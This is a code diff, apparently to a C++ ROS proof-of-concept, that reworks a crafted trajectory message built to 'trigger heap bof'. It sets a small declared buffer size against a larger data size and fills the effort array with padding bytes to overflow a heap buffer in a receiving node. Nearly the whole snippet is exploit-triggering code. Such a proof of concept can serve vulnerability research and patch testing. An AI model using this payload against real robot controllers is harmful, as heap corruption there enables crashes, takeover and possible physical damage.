@@ -68,16 +68,18 @@ int main(int argc, char ** argv)
 
     // trigger heap bof
     if (i >= 50) {
-      trajectory_point_msg.effort.resize(80);
-      trajectory_point_msg.effort[0] = 32.0; // buffer size 32
-      trajectory_point_msg.effort[1] = 64.0; // data size 64
+      trajectory_point_msg.effort.resize(100);
+      trajectory_point_msg.effort[0] = 16.0;
+      trajectory_point_msg.effort[1] = 95.0;
       
-      for (int j = 2; j < 66; j++) {
-        trajectory_point_msg.effort[j] = 67.0; // 'C'
-      }
-      
-      for (int j = 66; j < 80; j++) {
-        trajectory_point_msg.effort[j] = 68.0;  // 'D'
+      for (int j = 2; j < 100; j++) {
+        if (j < 34) {
+          trajectory_point_msg.effort[j] = 65.0; // 'A'
+        } else if (j < 66) {
+          trajectory_point_msg.effort[j] = 66.0; // 'B'
+        } else {
+          trajectory_point_msg.effort[j] = 67.0 + (j % 10);
+        }
       }
     } else {
       trajectory_point_msg.effort.clear();
